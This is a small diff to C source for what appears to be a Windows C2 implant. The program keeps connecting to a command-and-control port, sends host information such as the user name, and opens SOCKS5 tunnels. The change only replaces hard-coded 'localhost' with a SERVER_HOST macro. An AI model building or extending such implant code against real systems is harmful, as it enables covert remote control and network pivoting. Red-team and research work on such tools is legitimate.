@@ -12,6 +12,7 @@
 
 #define TUNNEL_PORT 5050
 #define C2_PORT 7070
+#define SERVER_HOST "localhost"
 
 #define MAX_BUFFER_SIZE 32768
 #define SOCKS5_VERSION 5
@@ -159,7 +160,7 @@ DWORD WINAPI NewTunnel(LPVOID lpThreadParameter) {
   char HOST[256];
   WORD PORT;
 
-  SOCKET ServerTunnel = Connect("localhost", TUNNEL_PORT);
+  SOCKET ServerTunnel = Connect(SERVER_HOST, TUNNEL_PORT);
   if (ServerTunnel != SOCKET_ERROR) {
     if (ReceiveBuffer(ServerTunnel, (char *) &Socks5Method, sizeof(Socks5MethodSel)) > 0) {
 
@@ -267,7 +268,7 @@ int main() {
 
   if (WSAStartup(MAKEWORD(2, 2), &WsaData) == 0) {
     while (TRUE) {
-      C2Socket = Connect("localhost", C2_PORT);
+      C2Socket = Connect(SERVER_HOST, C2_PORT);
       if (C2Socket != INVALID_SOCKET) {
         // Send some info to the server
         char UserName[255];
